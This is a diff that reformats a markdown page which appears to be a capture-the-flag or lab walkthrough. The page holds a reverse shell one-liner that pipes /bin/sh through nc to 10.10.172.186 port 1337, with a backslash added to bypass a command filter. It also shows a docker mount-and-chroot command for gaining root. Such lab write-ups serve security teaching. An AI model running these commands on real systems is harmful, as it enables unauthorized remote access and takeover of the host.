@@ -52,9 +52,8 @@ Used this to find a way to bypass the filter. by adding a \ in the middle of the
 
 **Web**
 
-```
-r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.172.186 1337 >/tmp/f
-```
+<pre><code><strong>r\m /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&#x26;1|nc 10.10.172.186 1337 >/tmp/f
+</strong></code></pre>
 
 **Kali**
 
@@ -247,12 +246,3 @@ docker run -v /:/mnt --rm -it alpine chroot /mnt sh
 ```
 
 <figure><img src="../../.gitbook/assets/image (34) (1) (1).png" alt=""><figcaption></figcaption></figure>
-
-
-
-
-
-
-
-
-
